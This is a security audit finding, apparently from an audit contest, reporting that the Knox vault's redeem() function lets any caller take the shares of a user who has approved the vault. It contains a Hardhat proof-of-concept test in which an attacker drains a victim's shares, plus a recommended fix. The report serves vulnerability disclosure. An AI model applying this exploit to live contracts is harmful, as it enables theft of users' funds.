# [H] Users are left exposed after approving the vault address for vault shares redemption

## Summary
Severity: High
Reporter: CRYP70
Source: https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/vault/VaultBase.sol#L104
Type: audit-issue

## Details
# Users are left exposed after approving the vault address for vault shares redemption

## Summary
There exists a `vault.redeem()` function which allows users to redeem their shares from a vault and return those shares back into the user. A user will call `Queue.setApprovalForAll(vault.address, true)` against the vault. Thinking that the vault has a friendly address, this actually exposes users to attack. 

## Vulnerability Detail
When the `vault` has been assigned to the  `queue` as `setApproveForAll`, this sets full approval rights given to an operator - in this instance the vault. If the vault is set to approved in the queue (as expected), any user can call `redeem()` on the vault and steal another user's funds. 

## Impact
The result of this is the direct theft of vault shares. In addition to this, once a user calls `setApprovalForAll()`, a user might forget to reset this back to false - as a result, an attacker could keep coming back and calling `redeem()` using the victims address as the `owner` once again because there are no checks in the vault base. I have awarded this a "high" in severity because this results in a direct theft of vault shares where the adversary benefits a great deal at the cost of the victim. In addition to this, it's fairly trivial to execute the attack on a victim. 

## Code Snippet
https://github.com/sherlock-audit/2022-09-knox/blob/main/knox-contracts/contracts/vault/VaultBase.sol#L104

## Proof of Concept
```javascript
describe("else if auction is cancelled", () => {
	time.revertToSnapshotAfterEach(async () => {
	  // lp1 deposits into queue
	  await asset
		.connect(signers.lp1)
		.approve(addresses.queue, params.deposit);
	
	  await queue.connect(signers.lp1)["deposit(uint256)"](params.deposit);
	
	  // init epoch 0 auction
	  let [startTime, endTime, epoch] = await knoxUtil.initializeAuction();
	
	  // init epoch 1
	  await time.fastForwardToFriday8AM();
	  await knoxUtil.initializeEpoch();
	
	  // auction 0 starts
	  await time.increaseTo(startTime);
	
	  // buyer1 purchases all available options
	  await asset
		.connect(signers.buyer1)
		.approve(addresses.auction, ethers.constants.MaxUint256);
	
	  await auction
		.connect(signers.buyer1)
		.addMarketOrder(
		  epoch,
		  await auction.getTotalContracts(epoch),
		  ethers.constants.MaxUint256
		);
	
	  // fast forward to 24 hours after auction ends
	  await time.increaseTo(endTime.add(86400));
	  // await auction.finalizeAuction(epoch);
	
	  // process auction 0
	  await vault.connect(signers.keeper).processAuction();
	});
	
	it("should permit redemptions after withdrawal lock has been reset", async () => {
	  // init auction 1
	  let [startTime] = await knoxUtil.initializeAuction();
	
	  await queue
		.connect(signers.lp1)
		.setApprovalForAll(addresses.vault, true);
	
	  await vault
		.connect(signers.lp1)
		.redeem(0, addresses.lp1, addresses.lp1);
	
	  // auction 1 starts
	  await time.increaseTo(startTime);
	
	  // lock should activate when auction starts
	  await expect(
		vault.connect(signers.lp1).redeem(0, addresses.lp1, addresses.lp1)
	  ).to.be.revertedWith("auction has not been processed");
	});
	
	it("should allow attacker to redeem victims vault shares", async () => { // <-------
	  const mySigners = await ethers.getSigners();
	  const eve = mySigners[10]; // A completely random unknown signer
	  const alice = signers.lp1;
	  
	  await queue
		.connect(alice)
		.setApprovalForAll(addresses.vault, true);
	
	  console.log("ALICE VAULT SHARE BALANCE BEFORE REDEEM: " + ethers.utils.formatEther(await vault.balanceOf(alice.address)));
	  console.log("EVE VAULT SHARE BALANCE BEFORE REDEEM: " + ethers.utils.formatEther(await vault.balanceOf(eve.address)));
	
	  const eveVault = await vault.connect(eve);
	  await eveVault.redeem(0, eve.address, alice.address);
	
	  console.log("ALICE VAULT SHARE BALANCE AFTER REDEEM: " + ethers.utils.formatEther(await vault.balanceOf(alice.address)));
	  console.log("EVE VAULT SHARE BALANCE AFTER REDEEM: " + ethers.utils.formatEther(await vault.balanceOf(eve.address)));
	
	  await expect(Number(ethers.utils.formatEther(await vault.balanceOf(alice.address)))).to.equal(0.0);
	  await expect(Number(ethers.utils.formatEther(await vault.balanceOf(eve.address)))).to.be.gte(10.0);
	});

});
```
The proof of concept is the `Should allow attacker to redeem victims vault shares` test where it can be appended to `should permit redemptions after withdrawal lock has been reset` in the `Vault.behaviour.ts` test file. 

## Tool used
Manual Review

## Recommendation
I recommend implementing a delegation system where users can elect another user(s) that they trust to withdraw funds on their behalf, then checking in the `VaultBase.sol` in the function of `redeem()` that the calling user is either the owner or they have been delegated to redeem as opposed to leaving victim shares totally exposed.
